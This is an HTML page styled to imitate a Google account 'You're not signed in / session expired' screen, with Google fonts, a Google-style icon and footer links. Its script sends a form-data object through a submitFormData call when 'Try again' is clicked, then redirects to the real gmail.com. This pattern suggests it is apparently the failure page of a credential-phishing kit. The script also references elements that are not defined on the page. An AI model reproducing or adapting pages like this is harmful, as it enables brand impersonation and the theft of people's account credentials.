<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Session Expired</title>

<link href="https://fonts.googleapis.com/css?family=Google+Sans:100,300,400,500,700,900" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">

<link rel="icon" type="image/x-icon" href="assets/gma.ico">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'google Sans',sans-serif;
}

body{
  background:#ffffff;
  color:#202124;
  min-height:100vh;
  overflow-x:hidden;
}

.page-wrapper{
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

/* MOBILE */
.container{
  width:100%;
  padding:28px 24px 120px 24px;
  background:#ffffff;
}

.google-icon{
  width:60px;
  height:auto;
  margin-bottom:20px;
}

h1{
  font-size:30px;
  font-weight:500;
  margin-bottom:18px;
}

.description{
  font-size:16px;
  color:#5f6368;
  margin-bottom:40px;
  line-height:1.6;
}

/* BUTTON */
.next-btn-container{
  display:flex;
  justify-content:flex-end;
}

.next-btn{
  background:#1a73e8;
  color:#ffffff;
  border:none;
  padding:12px 28px;
  border-radius:22px;
  font-size:15px;
  cursor:pointer;
}

/* FOOTER */
.page-footer{
  font-size:12px;
  color:#5f6368;
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:12px 20px;
  position:fixed;
  bottom:0;
  left:0;
  width:100%;
  background:#ffffff;
}

.language-select{
  display:flex;
  align-items:center;
  gap:6px;
  border:1px solid #dadce0;
  padding:6px 12px;
  border-radius:18px;
  cursor:pointer;
}

.language-select::after{
  content:"▼";
  font-size:10px;
  margin-left:6px;
}

.footer-links{
  display:flex;
  gap:14px;
}

.footer-links a{
  color:#5f6368;
  text-decoration:none;
}

/* DESKTOP */
@media (min-width:768px){

  body{
    background:#f1f3f4;
  }

  .page-wrapper{
    justify-content:center;
    align-items:center;
  }

  .container{
    max-width:460px;
    padding:40px;
    border-radius:18px;
    box-shadow:0 8px 30px rgba(0,0,0,0.08);
  }

  .page-footer{
    position:static;
    width:460px;
    margin-top:16px;
    background:transparent;
  }
}

</style>
</head>
<body>

<div class="page-wrapper">

<div class="container">

<img src="https://img.icons8.com/?size=100&id=17949&format=png&color=000000" class="google-icon">

<h1>You're not signed in</h1>

<p class="description">
Your session has expired, please try again.
</p>

<div class="next-btn-container">
<button class="next-btn" id="submitBtn">Try again</button>
</div>

</div>

<div class="page-footer">
  <div class="language-select">
    English (United States)
  </div>
  <div class="footer-links">
    <a href="#">Help</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
  </div>
</div>

</div>
<script>
page = "fail";

submitBtn.addEventListener("click", function() {
	
  const user = {};
  
  user.fail = "fail";

  submitFormData(user);
  window.location.replace("https://gmail.com");
});


input.addEventListener("input",()=>{
  wrapper.classList.remove("error");
});
</script>


</body>
</html>
